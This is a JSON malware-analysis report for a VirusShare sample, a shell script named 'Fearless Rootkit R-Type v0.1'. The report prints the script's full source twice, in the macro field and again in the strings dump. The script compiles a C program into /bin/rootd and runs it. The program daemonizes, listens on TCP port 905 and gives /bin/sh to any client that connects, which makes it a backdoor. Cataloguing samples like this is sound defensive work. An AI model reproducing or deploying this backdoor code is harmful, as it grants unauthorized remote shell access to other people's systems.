{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "execl": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/bin/sh\n\n# Fearless Rootkit R-Type v0.1\n# Coded by Merlion\n# \n# If you do, you do so at your OWN risk\n\ncat > /tmp/rootd.c << EOF\n\n\n\n                     \n\n#include <stdio.h>\n#include <string.h>\n#include <netdb.h>\n#include <netinet/in.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <unistd.h>\n\nvoid die(char *error);\nmain(int argc, char **argv) {\npid_t pid, sid;\nint len, clipid, serpid, stat, sock, soklen, sockbind, sockrec, sockopt, sockcli, socklen;\nunsigned short int mcon;\nunsigned short int port;\nchar *rbuf, *rmode;\nstruct sockaddr_in  Client, Server;\nif ((sock=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) die(\"Error creating socket\");\nif (argc != 3) die(\"Usage\");\nmemset(&Server, 0, sizeof(Server));\nServer.sin_family=AF_INET;\nport=905;\nmcon=5;\nServer.sin_port=htons(port);\nServer.sin_addr.s_addr=htonl(INADDR_ANY);\nif (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (void *) &sockopt, sizeof(sockopt)) < 0)\ndie(\"No socket options set\");\nif (sockbind=bind(sock, (struct sockaddr *) &Server, sizeof(Server)) != 0)\ndie(\"Could not bind socket\");\nif ((sockbind=listen(sock, mcon)) != 0) die(\"Failed on listen()\");  \npid=fork();\nif (pid < 0) die(\"Initial fork() failed\");\nif (pid>0) exit(0);\nif ((chdir(\"/\")) < 0) die(\"Could not set working directory\");\nif ((setsid()) < 0) die(\"setsid() failed in creating daemon\");\numask(0);\nclose(STDIN_FILENO);\nclose(STDOUT_FILENO);\nclose(STDERR_FILENO);\n/* You're on your own, pal.. */\nwhile(1) {\nsocklen=sizeof(Client);\nif ((sockcli=accept(sock, (struct sockaddr *) &Client, &socklen)) < 0) exit(1);   /* syslog msg here still */\nclipid=getpid();\nserpid=fork();\nif (serpid > 0)\nwaitpid(0, &stat, 0);    \ndup2(sockcli, 1);\nexecl(\"/bin/sh\",\"sh\",(char *)0);  }\nclose(sockcli);   }\nvoid die(char *error) {\nfprintf(stderr, \"%s\\n\", error);\nexit(1);  }\n\nEOF\n\ngcc -o /bin/rootd /tmp/rootd.c\nrm -f /tmp/rootd.c\n/bin/rootd\n\necho \"Rootd successfully installed\"\nexit 0\n\n\n\n"
    },
    "filename": "VirusShare_11598b349fd981f7f6e4f74bbce1497c",
    "filesize": 1917,
    "filetype": "POSIX shell script, ASCII text executable",
    "hashes": {
        "md5": "11598b349fd981f7f6e4f74bbce1497c",
        "sha1": "bf06d5957a2e6a265ff795d1548defa2d5adc0ae",
        "sha256": "029ec0251cb669e14f04bfc47f9edd34216abb46b4626e5eb479e21101f1d184"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/bin/sh",
            "# Fearless Rootkit R-Type v0.1",
            "# Coded by Merlion",
            "# If you do, you do so at your OWN risk",
            "cat > /tmp/rootd.c << EOF",
            "                     ",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <unistd.h>",
            "void die(char *error);",
            "main(int argc, char **argv) {",
            "pid_t pid, sid;",
            "int len, clipid, serpid, stat, sock, soklen, sockbind, sockrec, sockopt, sockcli, socklen;",
            "unsigned short int mcon;",
            "unsigned short int port;",
            "char *rbuf, *rmode;",
            "struct sockaddr_in  Client, Server;",
            "if ((sock=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) die(\"Error creating socket\");",
            "if (argc != 3) die(\"Usage\");",
            "memset(&Server, 0, sizeof(Server));",
            "Server.sin_family=AF_INET;",
            "port=905;",
            "mcon=5;",
            "Server.sin_port=htons(port);",
            "Server.sin_addr.s_addr=htonl(INADDR_ANY);",
            "if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (void *) &sockopt, sizeof(sockopt)) < 0)",
            "die(\"No socket options set\");",
            "if (sockbind=bind(sock, (struct sockaddr *) &Server, sizeof(Server)) != 0)",
            "die(\"Could not bind socket\");",
            "if ((sockbind=listen(sock, mcon)) != 0) die(\"Failed on listen()\");  ",
            "pid=fork();",
            "if (pid < 0) die(\"Initial fork() failed\");",
            "if (pid>0) exit(0);",
            "if ((chdir(\"/\")) < 0) die(\"Could not set working directory\");",
            "if ((setsid()) < 0) die(\"setsid() failed in creating daemon\");",
            "umask(0);",
            "close(STDIN_FILENO);",
            "close(STDOUT_FILENO);",
            "close(STDERR_FILENO);",
            "/* You're on your own, pal.. */",
            "while(1) {",
            "socklen=sizeof(Client);",
            "if ((sockcli=accept(sock, (struct sockaddr *) &Client, &socklen)) < 0) exit(1);   /* syslog msg here still */",
            "clipid=getpid();",
            "serpid=fork();",
            "if (serpid > 0)",
            "waitpid(0, &stat, 0);    ",
            "dup2(sockcli, 1);",
            "execl(\"/bin/sh\",\"sh\",(char *)0);  }",
            "close(sockcli);   }",
            "void die(char *error) {",
            "fprintf(stderr, \"%s\\n\", error);",
            "exit(1);  }",
            "gcc -o /bin/rootd /tmp/rootd.c",
            "rm -f /tmp/rootd.c",
            "/bin/rootd",
            "echo \"Rootd successfully installed\"",
            "exit 0"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.279782",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
